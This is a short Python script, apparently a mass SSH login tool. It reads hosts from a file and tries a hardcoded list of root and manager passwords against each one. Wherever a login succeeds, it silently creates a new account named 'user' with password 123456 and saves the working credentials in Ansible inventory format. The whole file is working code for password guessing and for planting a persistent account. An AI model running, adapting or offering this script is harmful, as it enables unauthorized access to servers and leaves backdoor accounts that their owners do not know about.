#!/usr/bin/env python
# coding:utf8

import paramiko

login_failed = open('files/login_failed.txt', 'w')
login_success = open('files/login_success.txt', 'w')

ipfile = '/tmp/hehe'
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
paramiko.util.log_to_file("filename.log")

user_info = {
    'root': ['pandora!74', '123456', 'foss!74', 'esb!74', 'pandora!75', '111111'],
    'manager': ['manager!74']
}

sort = ['manager', 'root']
COMMAND = 'useradd -p `openssl passwd -1 -salt "some" 123456` user'
def auth(f):
    ip, port = f.split()
    for username in sort:
        for password in user_info[username]:
            try:
                ssh.connect(hostname=ip, username=username, password=password, port=int(port), timeout=1)
                ssh.exec_command(COMMAND)
                login_success.write("%s ansible_port=%s ansible_user=%s ansible_ssh_pass=%s\n"
                                    % (ip, port, username, password))
                return
            except:
                continue
    else:
        login_failed.write(ip + '\n')

f = open(ipfile, 'r')

for j in f:
    auth(j)